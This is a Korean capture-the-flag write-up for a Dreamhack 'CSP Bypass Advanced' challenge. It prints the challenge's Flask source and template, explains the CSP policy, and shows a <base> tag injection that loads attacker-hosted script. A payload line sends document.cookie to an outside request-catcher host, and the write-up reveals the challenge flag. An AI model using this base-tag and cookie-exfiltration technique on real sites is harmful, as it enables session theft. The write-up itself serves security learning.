https://honey-push-30b.notion.site/CSP-Bypass-Advanced-3b710ab686fe4bcc8996c97bb03f2c46

# 문제파일 다운로드

![문제파일 다운로드.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/cb9ebaa1-7850-4f4d-bd74-0e7601a85b45/%EB%AC%B8%EC%A0%9C%ED%8C%8C%EC%9D%BC_%EB%8B%A4%EC%9A%B4%EB%A1%9C%EB%93%9C.png)

CSP Bypass Advanced 문제파일을 다운로드 받으면 다른 문제와 다르게 app.py만 있는 것이 아니라 vuln.html이 같이 있는 것을 확인할 수 있다.

일단 먼저 app.py를 확인해보자.

```python
#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)
nonce = os.urandom(16).hex()

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"

def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome("/chromedriver", options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True

def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)

@app.after_request
def add_header(response):
    global nonce
    response.headers['Content-Security-Policy'] = f"default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'self' 'nonce-{nonce}'; object-src 'none'"
    nonce = os.urandom(16).hex()
    return response

@app.route("/")
def index():
    return render_template("index.html", nonce=nonce)

@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    return render_template("vuln.html", param=param, nonce=nonce)

@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html", nonce=nonce)
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return f'<script nonce={nonce}>alert("wrong??");history.go(-1);</script>'

        return f'<script nonce={nonce}>alert("good");history.go(-1);</script>'

memo_text = ""

@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text, nonce=nonce)

app.run(host="0.0.0.0", port=8000)
```

/flag페이지에서 POST로 원하는 값을 입력하여 서버측 쿠키를 가지고 vuln페이지에 param으로 전달하여 실행해준다.  

이제 기존 CSP Bypass 문제와 달라진 것이 vuln페이지에서 실행된 값을 그대로 출력해 주는 것이 아니라 vuln.html 페이지 template으로 리턴해준다. 이 템플릿이 바로 문제파일을 다운로드 해서 준 vuln.html이다.

vuln.html을 열어보면 아래와 같은 형태임을 볼 수 있다.

 

![vuln페이지.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5bf1e88e-4f3c-4e9b-b5e4-b3d3d8cfcc1a/vuln%ED%8E%98%EC%9D%B4%EC%A7%80.png)

```python
{% extends "base.html" %}
{% block title %}Index{% endblock %}

{% block head %}
  {{ super() }}
  <style type="text/css">
    .important { color: #336699; }
  </style>
{% endblock %}

{% block content %}
  {{ param | safe }}
{% endblock %}
```

이는 {% %} 는 템플릿이며 jinja를 기본으로 하는 템플릿이다.

여기서 param으로 전달받은 값이 {{ param }}위치에 들어가는 것은 알 수 있는데 | safe가 추가되어 있는 것을 볼 수 있다. 이게 무슨 뜻인지 찾아본 결과 safe가 추가되어있으면 < 이나 >같은 특수문자들을 그대로 출력할 수 있게 해준다. 즉 safe가 없으면 &가 &amp;로 출력되는데 safe를 해주면 &로 그대로 출력이 된다. (그러면 더 위험한거 아닌가 싶은데 왜 safe인지 모르겠음)

즉 내가 <script>과 같이 param으로 전달해주면 <>이 변환이 되지 않고 그대로 쓰여져서 내가 태그를 넣을 수 있다는 사실을 알았다.

자 그러면 app.py에서 CSP 정책을 살펴보자

```python
@app.after_request
def add_header(response):
    global nonce
    response.headers['Content-Security-Policy'] = f"default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'self' 'nonce-{nonce}'; object-src 'none'"
    nonce = os.urandom(16).hex()
    return response
```

response.headers['Content-Security-Policy'] = f"default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'self' 'nonce-{nonce}'; object-src 'none'"

1. default 즉 따로 정의 되어 있지 않으면 기본적으로 내부 페이지의 자원은 self(127.0.0.1) 즉 같은 오리진에 있어야한다. 
2. img 태그의 경우 [https://dreamhack.io로](https://dreamhack.io로) 시작하는 경로에 있어야한다.
3. style 태그의 경우 인라인 태그를 허용하며 내부 페이지의 자원이 self로 부터 즉 같은 오리진에 있어야 한다. 
4. script 태그또한 같은 오리진에서 있어야 하며 nonce값이 일치해야한다.
5. object의 출처는 어떤것이든 허용하지 않는다.

- 오리진이란? → 도메인 + 프로토콜+포트번호
    
    오리진과 비슷한 개념으로는 도메인(domain)이 있다. 둘 사이의 구체적인 예로는 아래와 같다.
    
    - 도메인(domain): naver.com
    - 오리진(origin): [https://www.naver.com/PORT](https://www.naver.com/PORT)
    
    이와 같이 도메인과 오리진의 차이는 프로토콜과 포트번호의 포함 여부이다.
    

여기서 취약한점은 <base> 태그가 설정이 되어있지 않다는 점이다. 따로 정의되어 있지 않은 경우 default를 따르지만 base태그는 예외로 default를 따르지 않기에 base 태그가 안되어 있어 삽입을 할 수 있다면 공격의 여지가 있다.

![vuln페이지 삽입.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/544f07a4-ff9c-4155-9a9c-b337f8547fed/vuln%ED%8E%98%EC%9D%B4%EC%A7%80_%EC%82%BD%EC%9E%85.png)

그리고 vuln페이지를 살펴보면 하단에 script src=”/static/js/jquery.min.js” 와 같이 내부 스크립트를 불러오는 것을 볼 수 있는데 이는 상대경로로 작성이 되어 있어 base태그를 이용해 내 웹서버를 가리키게 하고 내 웹서버의 /static/js/jquery.min.js를 가리키게 한다면 self(같은 오리진)도 충족시키고 내가 원하는 스크립트를 실행시킬 수 있다.

웹서버는 [https://itadventure.tistory.com/372](https://itadventure.tistory.com/372) 를 참고해서 AWS를 이용하여 웹서버를 구축했다. 이 과정을 따라서 만든 웹서버의 경우 nginx서비스를 이용하였으며 블로그에 써져있듯이 웹 서버에 접속하게 되면 처음으로 뜨는 index.html의 경로가 `/usr/share/nginx/html/index.html` 임을 알 수 있다.

그러면 우리가 base 태그를 이용하여 저 웹서버를 가리키게 하면 /usr/share/nginx/html이 기본적인 위치임을 알 수 있으므로 /usr/share/nginx/html로 이동후 static 폴더를 만들고 그 내부에 js 폴더를 만들고 jsquery.min.js 파일을 만들어서 다음과 같은 스크립트를 작성했다.

location.href="[http://host3.dreamhack.games:17165/memo?memo=hi](http://host3.dreamhack.games:17165/memo?memo=hi)" 를 작성한 후 flag페이지에서 아래와 같은 base 태그를 삽입해보았다. 참고로 이 때 웹서버의 주소는 블로그에도 나와있듯이 내 웹서버의 퍼블릭 IPv4 DNS 주소를 복사하면 된다.

```python
<base href="http://ec2-13-124-195-124.ap-northeast-2.compute.amazonaws.com">
```

![hi가 성공한 모습.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a69606cf-eff6-4d06-8b1f-e1296691752f/hi%EA%B0%80_%EC%84%B1%EA%B3%B5%ED%95%9C_%EB%AA%A8%EC%8A%B5.png)

정상적으로 hi가 memo에 적혀있는 것을 볼 수 있다. 즉 내가 원하는 스크립트를 실행시키는 것을 달성했으므로 이제 cookie값을 빼내기만 하면 된다. 

location.href에 host3.dreamhack~~의 uri를 이용해서 memo에 출력하려고 했는데 잘 안되길래 dreamhack tools 서비스를 이용하여 내 링크에 보내도록 스크립트를 짰다.

![성공한 js 파일의 내용.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b546a894-67f7-45a1-bce0-c265f88ebf49/%EC%84%B1%EA%B3%B5%ED%95%9C_js_%ED%8C%8C%EC%9D%BC%EC%9D%98_%EB%82%B4%EC%9A%A9.png)

`location.href="[https://nhxkhmb.request.dreamhack.games?memo=](https://nhxkhmb.request.dreamhack.games/?memo=)"+document.cookie`

그리고 나서 다시 `<base href="http://ec2-13-124-195-124.ap-northeast-2.compute.amazonaws.com">`를 flag 페이지에서 입력하여 vuln페이지에 삽입해주면

![성공!!.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/69b76178-4ee5-4e25-8115-4300075d906f/%EC%84%B1%EA%B3%B5!!.png)

`flag=DH{833a8a65e3907796ccc447ff75e1dfe6}` 플래그 값을 받아온 것을 볼 수 있다.
